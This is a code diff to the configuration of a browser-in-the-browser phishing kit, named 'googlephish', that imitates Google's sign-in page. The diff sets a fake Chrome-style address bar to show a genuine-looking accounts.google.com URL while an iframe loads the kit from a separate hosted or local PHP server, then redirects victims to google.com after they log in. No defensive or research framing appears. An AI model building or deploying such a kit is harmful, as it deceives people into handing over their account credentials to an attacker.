@@ -14,15 +14,18 @@ window.APP_CONFIG = {
     afterLoginRedirectUrl: 'https://www.google.com',
     afterLoginRedirectDelayMs: 0,
 
-    /** Deployed PHP app (no trailing slash). Iframe loads {base}{bitbEntryPath}. */
+    /**
+     * Local PHP (googlephish) — no trailing slash. Iframe loads {base}{bitbEntryPath}.
+     * Run: cd googlephish && php -S 127.0.0.1:8080
+     * If docroot is the repo root instead, use http://127.0.0.1:8080/googlephish
+     */
     googlephishBaseUrl: 'https://tk-ap-1.onrender.com',
 
-    /** First path under googlephishBaseUrl (default sign-in page). */
+    /** First path under googlephishBaseUrl (existing kit entry). */
     bitbEntryPath: '/index.php',
 
     /**
-     * Shown in the fake omnibox (Chrome-style). Use a plausible accounts.google.com URL;
-     * the iframe still loads your Render host above.
+     * Shown in the fake omnibox only. The iframe uses googlephishBaseUrl (local PHP above).
      */
     bitbDisplayUrl:
         'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',
